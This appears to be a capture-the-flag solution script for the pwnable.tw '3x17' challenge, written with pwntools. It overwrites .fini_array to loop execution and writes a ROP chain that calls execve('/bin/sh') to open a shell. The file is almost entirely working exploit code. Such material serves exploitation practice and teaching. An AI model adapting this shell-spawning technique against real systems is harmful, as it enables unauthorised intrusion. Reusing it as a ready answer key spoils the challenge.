#!/bin/python
from pwn import *
import time

#conn = remote("chall.pwnable.tw", 10105)
conn = remote("127.0.0.1", 2323)


def send_data(addr, data):
    if isinstance(data, str):
        data_number = int.from_bytes(
            bytes(data, 'raw_unicode_escape'), byteorder="little")
    else:
        data_number = int.from_bytes(data, byteorder="little")

    with log.progress("Sending data %x / %d = %s / %x" % (addr, addr, data, data_number)) as p:
        conn.recvuntil('addr:')
        conn.sendline(str(addr))
        conn.recvuntil('data:')
        conn.send(data)
        p.success()


def main():
    fini_array_addr = 0x00000000004B40F0
    main_addr = 0x0000000000401B6D
    loop_func_addr = 0x0000000000402960
    start_addr =     0x0000000000446E2C

    context.terminal = ["gnome-terminal", "-e"]

    send_data(fini_array_addr, p64(loop_func_addr) + p64(main_addr))

    def rebase_0(opcode): return p64(opcode + 0x0000000000400000)
    def p(opcode): return p64(opcode)

    send_data(start_addr + 16 * 0, rebase_0(0x000000000000ecf2))
    send_data(start_addr + 16 * 1, '//bin/sh\x00')
    send_data(start_addr + 16 * 2, rebase_0(0x0000000000001696))
    send_data(start_addr + 16 * 3, rebase_0(0x00000000000b70e0))
    send_data(start_addr + 16 * 4, rebase_0(0x0000000000065573))
    send_data(start_addr + 16 * 5, p(0xdeadbeefdeadbeef))
    send_data(start_addr + 16 * 6, p(0xdeadbeefdeadbeef))
    send_data(start_addr + 16 * 7, p(0xdeadbeefdeadbeef))
    send_data(start_addr + 16 * 8, p(0xdeadbeefdeadbeef))
    send_data(start_addr + 16 * 9, rebase_0(0x000000000000ecf2))
    send_data(start_addr + 16 * 10, p(0x0000000000000000))
    send_data(start_addr + 16 * 11, rebase_0(0x0000000000001696))
    send_data(start_addr + 16 * 12, rebase_0(0x00000000000b70e8))
    send_data(start_addr + 16 * 13, rebase_0(0x0000000000065573))
    send_data(start_addr + 16 * 14, p(0xdeadbeefdeadbeef))
    send_data(start_addr + 16 * 15, p(0xdeadbeefdeadbeef))
    send_data(start_addr + 16 * 16, p(0xdeadbeefdeadbeef))
    send_data(start_addr + 16 * 17, p(0xdeadbeefdeadbeef))
    send_data(start_addr + 16 * 18, rebase_0(0x0000000000001696))
    send_data(start_addr + 16 * 19, rebase_0(0x00000000000b70e0))
    send_data(start_addr + 16 * 20, rebase_0(0x0000000000006c30))
    send_data(start_addr + 16 * 21, rebase_0(0x00000000000b70e8))
    send_data(start_addr + 16 * 22, rebase_0(0x0000000000046e35))
    send_data(start_addr + 16 * 23, rebase_0(0x00000000000b70e8))
    send_data(start_addr + 16 * 24, rebase_0(0x000000000001e4af))
    send_data(start_addr + 16 * 25, p(0x000000000000003b))
    send_data(start_addr + 16 * 26, rebase_0(0x0000000000071db5))

    # gdb.attach("3x17", "break *0x4b40f0")

    send_data(fini_array_addr, p64(loop_func_addr) + p64(start_addr))

    # rop
    conn.interactive()


main()
